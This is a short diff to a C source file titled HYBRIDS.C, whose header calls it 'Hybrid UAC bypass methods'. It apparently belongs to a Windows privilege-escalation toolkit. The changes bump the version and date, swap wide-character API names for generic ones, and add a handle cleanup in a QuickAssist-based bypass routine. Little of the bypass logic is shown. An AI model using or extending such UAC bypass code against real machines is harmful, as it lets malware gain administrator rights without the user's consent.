@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.68
+*  VERSION:     3.69
 *
-*  DATE:        07 Mar 2025
+*  DATE:        07 Jul 2025
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1553,7 +1553,7 @@ BOOLEAN ucmxModifyWebviewExecutableFolderPolicy(
 HANDLE ucmxRunQuickAssist()
 {
     WCHAR szBuffer[MAX_PATH * 2];
-    SHELLEXECUTEINFOW shinfo;
+    SHELLEXECUTEINFO shinfo;
 
     _strcpy(szBuffer, g_ctx->szSystemDirectory);
     _strcat(szBuffer, QUICKASSIST_EXE);
@@ -1565,7 +1565,7 @@ HANDLE ucmxRunQuickAssist()
     shinfo.lpParameters = NULL;
     shinfo.nShow = SW_MINIMIZE;
 
-    if (GetFileAttributesW(szBuffer) != INVALID_FILE_ATTRIBUTES) {
+    if (GetFileAttributes(szBuffer) != INVALID_FILE_ATTRIBUTES) {
         shinfo.lpFile = szBuffer;
     }
     else {
@@ -1664,7 +1664,7 @@ NTSTATUS ucmQuickAssistMethod(
             CloseHandle(hProcess);
             break;
         }
-
+        CloseHandle(hProcess);
         MethodResult = STATUS_SUCCESS;
 
     } while (FALSE);
